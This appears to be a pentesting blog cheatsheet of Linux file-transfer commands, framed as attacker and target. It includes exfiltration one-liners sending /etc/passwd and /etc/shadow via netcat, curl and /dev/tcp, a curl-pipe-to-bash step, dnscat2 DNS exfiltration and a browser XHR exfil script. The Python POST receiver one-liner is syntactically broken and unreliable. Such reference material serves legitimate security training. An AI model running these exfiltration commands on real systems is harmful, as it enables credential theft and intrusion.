---
layout: post
title: Linux File Transfer Cheatsheet 
date: 2025-04-10 16:14 +0300
categories: [Linux]
tags: [file transfer, pentest, linux]
---

## Basic HTTP Transfers

### Wget
```bash
# Download file
wget http://10.10.10.1:8000/shell.elf

# Download with custom output name
wget http://10.10.10.1:8000/shell.elf -O /tmp/safe.bin

# Download in background
wget -bq http://10.10.10.1:8000/shell.elf

# Download with authentication
wget --http-user=username --http-password=password http://10.10.10.1:8000/shell.elf
```

### cURL
```bash
# Download file
curl http://10.10.10.1:8000/shell.elf -o shell.elf

# Silent download
curl -s http://10.10.10.1:8000/shell.elf > shell.elf

# Download and pipe to bash
curl http://10.10.10.1:8000/shell.sh | bash

# Upload file with PUT
curl -T /etc/passwd http://10.10.10.1:8000/passwd
```

## Quick HTTP Servers

### Python
```bash
# Python 2 HTTP server
python -m SimpleHTTPServer 8000

# Python 3 HTTP server
python3 -m http.server 8000

# Bind to specific interface
python3 -m http.server 8000 --bind 192.168.1.2
```

### PHP
```bash
# One-liner web server
php -S 0.0.0.0:8000
```

### Ruby
```bash
ruby -run -ehttpd . -p8000
```

## Netcat Transfers

### Basic netcat
```bash
# Receiver (Target)
nc -lvnp 4444 > incoming_file

# Sender (Attacker)
nc 10.10.10.10 4444 < file_to_send
```

### Named pipe with netcat
```bash
# Receiver (for large files)
mkfifo /tmp/pipe; cat /tmp/pipe | tee outfile | md5sum &
nc -lvnp 4444 > /tmp/pipe

# Sender
cat file_to_send | nc 10.10.10.10 4444
```

## SCP and SFTP

### SCP
```bash
# Upload to target
scp /path/to/file user@10.10.10.10:/path/to/destination

# Download from target
scp user@10.10.10.10:/path/to/file /local/path

# With non-standard port
scp -P 2222 /path/to/file user@10.10.10.10:/path/to/destination

# Recursive directory transfer
scp -r /path/to/directory user@10.10.10.10:/path/to/destination
```

### SFTP
```bash
# Interactive session
sftp user@10.10.10.10

# SFTP commands:
# put /local/file   # Upload file
# get /remote/file  # Download file
# cd /remote/dir    # Change remote directory
# lcd /local/dir    # Change local directory
# bye               # Exit
```

## Base64 Transfer (For Small Files)

```bash
# On source
base64 -w 0 /path/to/file

# Copy the output, then on destination
echo "BASE64_STRING" | base64 -d > file
```

## OpenSSL Encrypted Transfer

```bash
# Receiver
openssl s_server -quiet -accept 4433 -cert /path/to/cert.pem -key /path/to/key.pem > incoming_file

# Sender
cat /path/to/file | openssl s_client -quiet -connect 10.10.10.10:4433
```

## FTP Transfer

```bash
# Start FTP server (if pyftpdlib is installed)
python3 -m pyftpdlib -p 21 -w

# FTP client commands:
ftp 10.10.10.10
user anonymous anonymous
binary
put file_to_upload
get file_to_download
bye
```

## SMB Transfers

### Impacket SMB Server (on attacker)
```bash
impacket-smbserver share -smb2support /path/to/files
```

### Mount SMB share (on target)
```bash
# Mount
mount -t cifs //10.10.10.10/share /mnt -o username=user,password=pass

# Access without mounting (Linux)
smbclient //10.10.10.10/share -U user
```

## SSH-Based Transfers

### SCP through SSH Tunnel
```bash
# Create SSH tunnel first
ssh -L 8000:localhost:8000 user@pivot_host

# Then transfer through the tunnel
scp -P 8000 file localhost:/path/
```

### SSH File Transfer without SCP
```bash
# Using dd and ssh
dd if=file bs=8192 | ssh user@10.10.10.10 "dd of=/path/to/file"
```

## Exfiltration Techniques

### Tar and Netcat
```bash
# Sender (target)
tar czf - /etc/passwd /etc/shadow | nc 10.10.10.10 4444

# Receiver (attacker)
nc -lvnp 4444 | tar xzf -
```

### Using /dev/tcp
```bash
# Sender (bash-only method)
cat file > /dev/tcp/10.10.10.10/4444

# Receiver
nc -lvnp 4444 > file
```

## Python Transfer Methods

### Simple HTTP POST
```bash
# Receiver (Attacker)
python3 -c 'from http.server import HTTPServer, BaseHTTPRequestHandler; import cgi; class Handler(BaseHTTPRequestHandler): def do_POST(self): length = int(self.headers["Content-Length"]); content = self.rfile.read(length); with open("received_file", "wb") as f: f.write(content); self.send_response(200); self.end_headers(); print("File received"); server = HTTPServer(("0.0.0.0", 8000), Handler); server.serve_forever()'

# Sender (Target)
python3 -c 'import requests; requests.post("http://10.10.10.10:8000", data=open("file_to_send", "rb"))'
```

### Python File Download
```bash
# One-liner file download with Python 2
python -c 'import urllib; urllib.urlretrieve("http://10.10.10.10:8000/file", "output_file")'

# One-liner with Python 3
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.10.10.10:8000/file", "output_file")'
```

## Dealing with Restricted Environments

### TFTP
```bash
# Start TFTP server (on attacker)
atftpd --daemon --port 69 /tftp

# Get file (on target)
tftp -i 10.10.10.10 GET file.txt
```

### DNS Exfiltration (Using dnscat2)
```bash
# Server (on attacker with domain)
dnscat2-server domain=exfil.com

# Client (on target)
./dnscat2 --dns domain=exfil.com file.txt
```

### JavaScript Web Browsers
```javascript
// In limited shells with web browsers like elinks/lynx
// Create a simple HTML file on your server with this script
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '/file.txt', true);
xhr.onload = function() {
    var xhr2 = new XMLHttpRequest();
    xhr2.open('POST', 'http://10.10.10.10:8000/exfil', true);
    xhr2.send(xhr.responseText);
};
xhr.send();
</script>
```

## File Transfer with Socat

```bash
# Receiver
socat TCP-LISTEN:4444,fork file:received_file,create

# Sender
socat -u file:file_to_send TCP:10.10.10.10:4444
```

## Compression Tips

```bash
# Single file (gzip)
gzip -c file > file.gz

# Directory (tar+gzip)
tar czf archive.tar.gz directory/

# Split large files
split -b 5M large_file part_
# Reassemble with:
cat part_* > large_file
```

## Living Off The Land

```bash
# When standard tools aren't available
# Using dd over TCP
dd if=file bs=1M | nc 10.10.10.10 4444

# Using cat and bash redirection
cat file > /dev/tcp/10.10.10.10/4444

# Using base64 via clipboard (manual)
base64 file  # Copy output
# On other system
echo "base64string" | base64 -d > file
```

## File Transfer using Magic Bits

```bash
# Create the magic file
echo '#!/bin/bash' > magic.sh
echo 'cat /etc/shadow' >> magic.sh
chmod +x magic.sh

# Encode for transfer
xxd -p magic.sh | tr -d '\n'
# Copy the hex output

# On target system
echo "hexoutput" | xxd -p -r > magic.sh
chmod +x magic.sh
./magic.sh
```

## Quick Reference - Best Method By Situation

- **Best for large files**: SCP, HTTP with curl/wget
- **Most likely to be available**: Netcat, Python HTTP server
- **Most stealthy**: Base64 encoding, DNS exfiltration
- **Most reliable**: HTTP transfers, especially with retries
- **Air-gapped systems**: Base64 encoding for manual transfer
- **Through multiple hops**: SSH port forwarding with SCP
